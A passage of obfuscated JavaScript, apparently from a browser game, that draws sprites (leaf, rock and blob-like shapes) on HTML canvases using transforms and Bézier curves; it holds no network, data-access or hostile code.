			Δ.translate(ᐃ * 270.5, ᐃ * 216.0625);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, ΔᐃⲆᐃ, 30 * ᐃ, ᐃ * ΔⲆᐃᐃΔΔᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
			Δ.save();
			Δ.translate(320.5 * ᐃ, ᐃ * 134.0625);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, 6, 30 * ᐃ, ⲆⲆⵠⲆᐃᐃⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ]);
			Δ.save();
			Δ.translate(224.5 * ᐃ, ᐃ * 138.0625);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, ⵠⵠⵠⲆⲆ, 30 * ᐃ, ᐃ * 15);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.save();
			Δ.translate(133.5 * ᐃ, 137.0625 * ᐃ);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, 6, 30 * ᐃ, 15 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ]);
			Δ.save();
			Δ.translate(ᐃ * 178.5, 56.0625 * ᐃ);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, ⵠⲆⵠⲆΔ, ᐃ * 30, ᐃ * 15);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			return Ⲇⵠ
		}

		function ⵠⵠⵠⵠⲆᐃᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 75;
			var ⵠⵠᐃ = ᐃ * 55;
			var ⵠⲆⵠ = 4 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(-30 * ᐃ, -40 * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.bezierCurveTo(67 * ᐃ, 56 * ᐃ, ᐃ * 72, 71 * ᐃ, 72 * ᐃ, 71 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 72, ᐃ * 71, 84 * ᐃ, 70 * ᐃ, 75 * ᐃ, ᐃ * 82);
			Δ.bezierCurveTo(ᐃ * 70, ᐃ * 88, 61 * ᐃ, ᐃ * 89, 58 * ᐃ, ᐃ * 89);
			Δ.bezierCurveTo(55 * ᐃ, 89 * ᐃ, 40 * ᐃ, 89 * ᐃ, 46 * ᐃ, ᐃ * 77);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 77, 43 * ᐃ, 63 * ᐃ, 43 * ᐃ, 63 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 35, ᐃ * 61, ᐃ * 35, ᐃ * 53, ᐃ * 42, 47 * ᐃ);
			Δ.bezierCurveTo(48 * ᐃ, ᐃ * 42, ᐃ * 62, 41 * ᐃ, ᐃ * 66, 43 * ᐃ);
			Δ.bezierCurveTo(70 * ᐃ, 45 * ᐃ, 72 * ᐃ, ᐃ * 48, 67 * ᐃ, ᐃ * 56);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.beginPath();
			Δ.bezierCurveTo(ᐃ * 68, 61 * ᐃ, ᐃ * 72, 76 * ᐃ, 72 * ᐃ, ᐃ * 76);
			Δ.bezierCurveTo(65 * ᐃ, 85 * ᐃ, ᐃ * 61, ᐃ * 85, ᐃ * 49, 83 * ᐃ);
			Δ.bezierCurveTo(49 * ᐃ, 83 * ᐃ, ᐃ * 44, 63 * ᐃ, ᐃ * 44, ᐃ * 63);
			Δ.bezierCurveTo(54 * ᐃ, 63 * ᐃ, 60 * ᐃ, 63 * ᐃ, 67 * ᐃ, ᐃ * 55);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.beginPath();
			Δ.moveTo(ᐃ * 69, 65 * ᐃ);
			Δ.bezierCurveTo(70 * ᐃ, 61 * ᐃ, ᐃ * 81, 66 * ᐃ, ᐃ * 86, 66 * ᐃ);
			Δ.bezierCurveTo(90 * ᐃ, ᐃ * 66, ᐃ * 97, ᐃ * 63, 97 * ᐃ, 56 * ᐃ);
			Δ.bezierCurveTo(97 * ᐃ, 50 * ᐃ, ᐃ * 93, ᐃ * 47, 88 * ᐃ, 44 * ᐃ);
			ΔⲆ(Δ, ᐃᐃⵠΔⵠ, Ⲇᐃ[ΔΔᐃⵠ], ΔⵠⵠΔ);
			Δ.beginPath();
			Δ.moveTo(50 * ᐃ, ᐃ * 48);
			Δ.bezierCurveTo(ᐃ * 43, ᐃ * 52, 50 * ᐃ, 54 * ᐃ, 51 * ᐃ, 54 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54, ᐃ * 54, 59 * ᐃ, 52 * ᐃ, 59 * ᐃ, 49 * ᐃ);
			Δ.bezierCurveTo(59 * ᐃ, ᐃ * 48, ᐃ * 55, ᐃ * 46, ᐃ * 50, ᐃ * 48);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃ]);
			return Ⲇⵠ
		}

		function ⵠⲆᐃΔᐃⵠⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 135;
			var ⵠⵠᐃ = 190 * ᐃ;
			var Δⵠ = ᐃⵠⵠ / Δᐃⵠⵠ;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ΔⵠΔΔ = ᐃ * ⲆⲆᐃΔΔ;
			var ⲆᐃⵠᐃΔ = 25 * ᐃ;
			var Δᐃⵠᐃⵠ = 180 * ᐃ;
			var ⵠⲆᐃⵠΔ = ⲆᐃⵠᐃΔ / ᐃⲆⵠᐃ;
			var ⵠᐃⲆⵠⲆ = Δᐃⵠᐃⵠ / ⵠⲆⵠⲆ;
			var ⵠⲆⵠ = ᐃ * ⵠⵠΔᐃΔ;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.rotate(-Math.PI / ⲆΔΔᐃ);
			Δ.globalAlpha = ⵠⲆΔ;
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ, -ⵠᐃⲆⵠⲆ, ⲆᐃⵠᐃΔ, Δᐃⵠᐃⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ], Ⲇᐃ[ᐃΔᐃⲆ], ⵠⲆⵠ);
			Δ.translate(ⵠΔⲆⵠ, 0);
			Δ.rotate(Math.PI / 5);
			Δ.globalAlpha = ᐃΔᐃⲆ;
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ, -ⵠᐃⲆⵠⲆ, ⲆᐃⵠᐃΔ, Δᐃⵠᐃⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], ⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ⲆᐃᐃⲆⲆⲆΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 155;
			Ⲇⵠ.height = ᐃ * 127;
			Δ.globalAlpha = .5;
			Δ.translate(ⵠΔⲆⵠ, ᐃ * 8);
			Δ.translate(-7 * ᐃ, ᐃ * -ⲆⲆⲆⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 55, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86, 64 * ᐃ, ᐃ * 117, ᐃ * 66, ᐃ * 134, ᐃ * 68);
			Δ.bezierCurveTo(ᐃ * 152, 69 * ᐃ, 165 * ᐃ, ᐃ * 86, ᐃ * 152, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 146, 87 * ᐃ, 122 * ᐃ, ᐃ * 89, 98 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(64 * ᐃ, ᐃ * 89, ᐃ * 41, 91 * ᐃ, 36 * ᐃ, 106 * ᐃ);
			Δ.bezierCurveTo(ⲆⲆⵠΔⵠ * ᐃ, 92 * ᐃ, 31 * ᐃ, ᐃ * 71, ᐃ * 54, ᐃ * 69);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.globalAlpha = ΔⲆᐃᐃ;
			Δ.translate(Δⵠᐃ, ᐃ * -8);
			Δ.translate(7 * ᐃ, 20 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(24 * ᐃ, 28 * ᐃ);
			Δ.bezierCurveTo(39 * ᐃ, ᐃ * 30, ᐃ * 37, 31 * ᐃ, 40 * ᐃ, 32 * ᐃ);
			Δ.bezierCurveTo(22 * ᐃ, ᐃ * 45, 26 * ᐃ, ᐃ * 58, 29 * ᐃ, 66 * ᐃ);
			Δ.bezierCurveTo(86.5 * ᐃ, 65 * ᐃ, ᐃ * 86.5, ᐃ * 65, 144 * ᐃ, ᐃ * 64);
			Δ.bezierCurveTo(151 * ᐃ, 42 * ᐃ, ᐃ * 132, ᐃ * ⵠⵠΔΔᐃ, ᐃ * 120, ⵠᐃⲆᐃᐃΔⵠ * ᐃ);
			Δ.bezierCurveTo(106 * ᐃ, 12 * ᐃ, ᐃ * 89, ᐃ * 0, ᐃ * 73, ᐃᐃⲆⲆ * ᐃ);
			Δ.bezierCurveTo(51 * ᐃ, ᐃᐃⲆᐃ * ᐃ, 36 * ᐃ, ⲆΔⲆⲆΔ * ᐃ, ᐃ * 25, 28 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ⵠΔΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 30, ᐃ * 41);
			Δ.bezierCurveTo(49 * ᐃ, 31 * ᐃ, ᐃ * 53, 29 * ᐃ, ᐃ * 62, ᐃ * 27);
			Δ.bezierCurveTo(ᐃ * 59, ᐃ * 24, 56 * ᐃ, ᐃ * 25, 53 * ᐃ, 24 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 67, ᐃ * ΔⵠΔᐃⵠ, ᐃ * 84, ᐃⲆⲆΔΔⲆᐃ * ᐃ, 120 * ᐃ, ᐃ * 16);
			Δ.bezierCurveTo(ᐃ * 107, ᐃ * ΔⲆΔⵠⲆⵠⲆ, ᐃ * 96, ⵠᐃΔⵠᐃ * ᐃ, ᐃ * 85, ⲆⵠΔΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 59, 3 * ᐃ, ᐃ * 54, ⲆⲆⵠⲆⵠ * ᐃ, 40 * ᐃ, 17 * ᐃ);
			Δ.bezierCurveTo(32.5 * ᐃ, 22.5 * ᐃ, 32.5 * ᐃ, 22.5 * ᐃ, 25 * ᐃ, 28 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 32, ᐃ * 30, ᐃ * 32, ᐃ * 30, ᐃ * 39, 32 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 24, 28 * ᐃ);
			Δ.bezierCurveTo(39 * ᐃ, ᐃ * 30, ᐃ * 37, 31 * ᐃ, 40 * ᐃ, 32 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 22, ᐃ * 45, 26 * ᐃ, 58 * ᐃ, ᐃ * 29, 66 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86.5, 65 * ᐃ, 86.5 * ᐃ, ᐃ * 65, ᐃ * 144, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151, 42 * ᐃ, 132 * ᐃ, ᐃ * 20, ᐃ * 120, ᐃᐃᐃᐃⲆᐃᐃ * ᐃ);
			Δ.bezierCurveTo(106 * ᐃ, 12 * ᐃ, 89 * ᐃ, ᐃ * 0, ᐃ * 73, ᐃ * 3);
			Δ.bezierCurveTo(51 * ᐃ, ΔΔᐃⲆ * ᐃ, 36 * ᐃ, ᐃ * 20, 25 * ᐃ, 28 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠΔⲆᐃ], ᐃ * 4);
			ⵠᐃᐃ(Δ, 18 * ᐃ, 38 * ᐃ, 14.866068747318506 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃⲆ], Ⲇᐃ[5], ᐃⲆᐃⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(39 * ᐃ, ᐃ * 30);
			Δ.bezierCurveTo(ᐃ * 27, 38 * ᐃ, 25 * ᐃ, ᐃ * 50, ᐃ * 26, ᐃ * 60);
			Δ.bezierCurveTo(36.5 * ᐃ, 58.5 * ᐃ, 36.5 * ᐃ, ᐃ * 58.5, 47 * ᐃ, 57 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ], Ⲇᐃ[ⵠⵠⵠΔ], ᐃ * ⲆⵠΔⵠ);
			Δ.translate(ᐃ * -7, -ⵠΔⵠⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 27, ᐃ * 74);
			Δ.bezierCurveTo(38 * ᐃ, 77.5 * ᐃ, 38 * ᐃ, 77.5 * ᐃ, ᐃ * 49, 81 * ᐃ);
			Δ.bezierCurveTo(54.5 * ᐃ, ᐃ * 75.5, 54.5 * ᐃ, 75.5 * ᐃ, 60 * ᐃ, ᐃ * 70);
			Δ.bezierCurveTo(ᐃ * 64, 72 * ᐃ, ᐃ * 64, ᐃ * 72, 68 * ᐃ, 74 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 80.5, ᐃ * 67.5, ᐃ * 80.5, ᐃ * 67.5, ᐃ * 93, 61 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104.5, 68 * ᐃ, 104.5 * ᐃ, 68 * ᐃ, ᐃ * 116, ᐃ * 75);
			Δ.bezierCurveTo(ᐃ * 120.5, 72.5 * ᐃ, 120.5 * ᐃ, ᐃ * 72.5, 125 * ᐃ, 70 * ᐃ);
			Δ.bezierCurveTo(129 * ᐃ, 75 * ᐃ, ᐃ * 129, ᐃ * 75, 133 * ᐃ, ᐃ * 80);
			Δ.bezierCurveTo(ᐃ * 145.5, 76.5 * ᐃ, 145.5 * ᐃ, 76.5 * ᐃ, ᐃ * 158, 73 * ᐃ);
			Δ.bezierCurveTo(158 * ᐃ, 87 * ᐃ, ᐃ * 158, 93 * ᐃ, ᐃ * 155, ᐃ * 95);
			Δ.bezierCurveTo(ᐃ * 152.5, ᐃ * 96, ᐃ * 152.5, ᐃ * 96, ᐃ * 150, ᐃ * 97);
			Δ.bezierCurveTo(ᐃ * 121, 85 * ᐃ, ᐃ * 108, 86 * ᐃ, 93 * ᐃ, 85 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 64, ᐃ * 85, ᐃ * 52, ᐃ * 95, 38 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 36, 98.5 * ᐃ, 36 * ᐃ, 98.5 * ᐃ, 34 * ᐃ, 98 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 25, 98 * ᐃ, 27 * ᐃ, 91 * ᐃ, 27 * ᐃ, ᐃ * 76);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ⲆⲆⲆᐃΔ], ᐃ * 6);
			return Ⲇⵠ
		}

		function ⵠᐃΔᐃⲆⵠΔⲆᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 195;
			var ⵠⵠᐃ = ᐃ * 190;
			var Δⵠ = ᐃⵠⵠ / ⲆⵠΔΔ;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ΔⵠΔΔ = ᐃ * ᐃⵠᐃΔⵠ;
			var ⲆᐃⵠᐃΔ = 35 * ᐃ;
			var Δᐃⵠᐃⵠ = ᐃ * 150;
			var ⵠⲆᐃⵠΔ = ⲆᐃⵠᐃΔ / 2;
			var ⵠᐃⲆⵠⲆ = Δᐃⵠᐃⵠ / 2;
			var ⵠⲆⵠ = ⲆᐃᐃΔ * ᐃ;
			Δ.translate(Δⵠ - 5 * ᐃ, ⲆⵠⲆ - ᐃᐃⲆᐃ * ᐃ);
			Δ.rotate(-Math.PI / 1.25);
			Δ.globalAlpha = ᐃΔᐃⲆ;
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ, -ⵠᐃⲆⵠⲆ, ⲆᐃⵠᐃΔ, Δᐃⵠᐃⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ΔΔΔ], ⵠⲆⵠ);
			Δ.translate(0, 0);
			Δ.rotate(Math.PI / ΔⲆΔᐃ);
			Δ.globalAlpha = ⵠΔᐃ;
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ, -ⵠᐃⲆⵠⲆ, ⲆᐃⵠᐃΔ, Δᐃⵠᐃⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ΔΔΔ], ⵠⲆⵠ);
			Δ.translate(0, ⵠᐃΔⵠ);
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ / ᐃⲆΔⲆ, -ⵠᐃⲆⵠⲆ / Ⲇⵠⵠᐃ, ⲆᐃⵠᐃΔ / 2, Δᐃⵠᐃⵠ / 3, ΔⵠΔΔ - ⵠⲆⵠⲆ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ]);
			return Ⲇⵠ
		}

		function ᐃⲆⲆᐃ(ᐃ, ⵠⵠΔⲆΔᐃΔ, ⲆᐃᐃⵠᐃΔⲆⵠⲆ, Ⲇᐃ, ᐃⲆΔΔΔ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 70 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 70;
			var ⲆⲆⵠ = ⲆⵠΔΔᐃ * ᐃ;
			var ᐃⵠΔⲆ = ⵠᐃΔⲆ * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ + ᐃⵠΔⲆ;
			for (var ⵠᐃ = ΔᐃΔΔ; ⵠⵠΔⲆΔᐃΔ.length > ⵠᐃ; ⵠᐃ++) {
				var ᐃΔᐃ = ⵠⵠΔⲆΔᐃΔ[ⵠᐃ];
				Δ.globalAlpha = ᐃΔᐃ.a;
				var ᐃⵠ = ᐃΔᐃ.f(ⲆᐃᐃⵠᐃΔⲆⵠⲆ, false, ᐃΔᐃ.c);
				Δ.save();
				Δ.translate(ᐃⵠⵠ / 2 + ᐃΔᐃ.x * ᐃ, ⵠⵠᐃ / 2 + ᐃ * ᐃΔᐃ.y);
				Δ.rotate(ᐃΔᐃ.r);
				Δ.drawImage(ᐃⵠ, -ᐃⵠ.width / Δᐃⵠⵠ, -ᐃⵠ.height / 2);
				Δ.restore()
			}
			var Ⲇⵠⵠ = [];
			for (var ⵠᐃ = ΔⲆⲆ; ⵠᐃ < Ⲇᐃ.length; ⵠᐃ++) {
				var ΔΔΔⵠΔᐃᐃ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				var ΔⵠΔⲆⵠ = ΔΔΔⵠΔᐃᐃ.getContext(ⵠ[289]);
				ΔΔΔⵠΔᐃᐃ.width = ᐃⵠⵠ;
				ΔΔΔⵠΔᐃᐃ.height = ⵠⵠᐃ + ᐃⵠΔⲆ;
				ΔⵠΔⲆⵠ.globalAlpha = ᐃⲆΔΔΔ / ⵠⲆⵠⲆ;
				ⵠᐃ == 2 ? Ⲇᐃᐃ(ΔⵠΔⲆⵠ, ᐃΔΔ, ᐃⵠΔⲆ, ᐃⵠⵠ, ⵠⵠᐃ, ⲆⲆⵠ) : Ⲇᐃᐃ(ΔⵠΔⲆⵠ, 0, 0, ᐃⵠⵠ, ⵠⵠᐃ + ᐃⵠΔⲆ, ⲆⲆⵠ);
				ΔⲆ(ΔⵠΔⲆⵠ, "#081a19");
				ΔⵠΔⲆⵠ.globalAlpha = ᐃⲆΔΔΔ;
				if (2 == ⵠᐃ) Ⲇᐃᐃ(ΔⵠΔⲆⵠ, 0, ᐃⵠΔⲆ, ᐃⵠⵠ, ⵠⵠᐃ, ⲆⲆⵠ);
				else Ⲇᐃᐃ(ΔⵠΔⲆⵠ, ⵠⲆⲆ, ⵠⲆⲆ, ᐃⵠⵠ, ⵠⵠᐃ, ⲆⲆⵠ);
				ΔⲆ(ΔⵠΔⲆⵠ, Ⲇᐃ[ⵠᐃ]);
				ΔⵠΔⲆⵠ.globalAlpha = ⲆⵠⲆⲆ;
				if (ⵠᐃ == ᐃⲆⵠᐃ) ΔⵠΔⲆⵠ.drawImage(Ⲇⵠ, ΔᐃΔΔ, ᐃⵠΔⲆ);
				else ΔⵠΔⲆⵠ.drawImage(Ⲇⵠ, 0, ᐃⵠⲆ);
				Ⲇⵠⵠ.push(ⵠᐃⵠ(ΔΔΔⵠΔᐃᐃ))
			}
			return Ⲇⵠⵠ
		}

		function ⵠΔⵠΔⵠΔᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 370 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 370;
			var Δⵠ = ᐃⵠⵠ / 2;
			var ⲆⵠⲆ = ⵠⵠᐃ / ᐃⲆΔⲆ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ⲆⲆⵠ = ᐃ * 180;
			Δ.globalAlpha = .2;
			ⵠᐃᐃ(Δ, Δⵠ, ⲆⵠⲆ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
			return Ⲇⵠ
		}

		function ⲆⲆΔⵠⵠⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 170;
			Ⲇⵠ.height = 173 * ᐃ;
			Δ.translate(ᐃ * 5, 5 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.save();
			Δ.translate(ᐃ * 86.25, ᐃ * 84.953125);
			Δ.rotate(.32);
			ⵠΔⵠᐃ(Δ, 7, ᐃ * 42.15447781671598, ΔⲆⵠⲆⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = ᐃⲆᐃ;
			Δ.translate(-ΔᐃΔⲆ * ᐃ, -ⲆΔΔᐃ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 86.25, 84.953125 * ᐃ);
			Δ.rotate(.32);
			ⵠΔⵠᐃ(Δ, ᐃᐃⵠⵠⵠ, 42.15447781671598 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆΔⲆ], ⲆⵠΔⵠ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : Ⲇᐃⵠ;
			Δ.translate(ᐃ * 5, ᐃ * 5);
			Δ.save();
			Δ.translate(86.25 * ᐃ, 84.953125 * ᐃ);
			Δ.rotate(.28);
			ⵠΔⵠᐃ(Δ, 7, 30.463092423455635 * ᐃ, ᐃ * ΔⲆⵠⲆⲆ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔΔᐃⵠ;
			Δ.translate(ᐃ * -5, -5 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 86.25, ᐃ * 84.953125);
			Δ.rotate(.28);
			ⵠΔⵠᐃ(Δ, ᐃᐃⵠⵠⵠ, ᐃ * 30.463092423455635, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], 4 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃᐃⲆΔ;
			Δ.translate(ᐃ * ΔⲆΔΔ, ᐃ * ⵠᐃΔⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 86.25, ᐃ * 84.953125, 18.867962264113206 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -ᐃⲆⵠⵠ, ᐃ * -ⵠᐃΔⲆ);
			ⵠᐃᐃ(Δ, 86.25 * ᐃ, ᐃ * 84.953125, 18.867962264113206 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⵠ], Ⲇᐃ[ⵠⵠⵠⲆⲆ], ᐃ * ⲆⵠᐃⲆ);
			return Ⲇⵠ
		}

		function ⲆⵠᐃᐃⵠⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 170;
			Ⲇⵠ.height = 173 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(5 * ᐃ, ᐃ * ⵠⵠΔΔ);
			Δ.save();
			Δ.translate(86.25 * ᐃ, ᐃ * 84.953125);
			ⵠΔⵠᐃ(Δ, 7, ᐃ * 9.848857801796104, ⵠⵠΔⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -5, ᐃ * -5);
			Δ.save();
			Δ.translate(86.25 * ᐃ, 84.953125 * ᐃ);
			ⵠΔⵠᐃ(Δ, 7, ᐃ * 9.848857801796104, ΔⵠⲆⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[8], Ⲇᐃ[9], ᐃ * 4);
			return Ⲇⵠ
		}

		function ⵠᐃΔᐃᐃⵠⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 52;
			Ⲇⵠ.height = ᐃ * 65;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 9.833328247070312, 12.078125 * ᐃ);
			Δ.bezierCurveTo(15.333328247070312 * ᐃ, ᐃ * 28.078125, 15.333328247070312 * ᐃ, ᐃ * 28.078125, ᐃ * 20.833328247070312, ᐃ * 44.078125);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠΔⵠΔ, Ⲇᐃ[1], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 7.8333282470703125, ᐃ * 20.078125);
			Δ.bezierCurveTo(ᐃ * 16.833328247070312, ᐃ * 32.578125, ᐃ * 16.833328247070312, ᐃ * 32.578125, ᐃ * 25.833328247070312, 45.078125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 23.833328247070312, ᐃ * 26.078125);
			Δ.bezierCurveTo(25.833328247070312 * ᐃ, ᐃ * 11.078125, ᐃ * 16.833328247070312, 8.078125 * ᐃ, 14.833328247070312 * ᐃ, 7.078125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 11.833328247070312, 17.078125 * ᐃ, 13.833328247070312 * ᐃ, 22.078125 * ᐃ, ᐃ * 23.833328247070312, ᐃ * 27.078125);
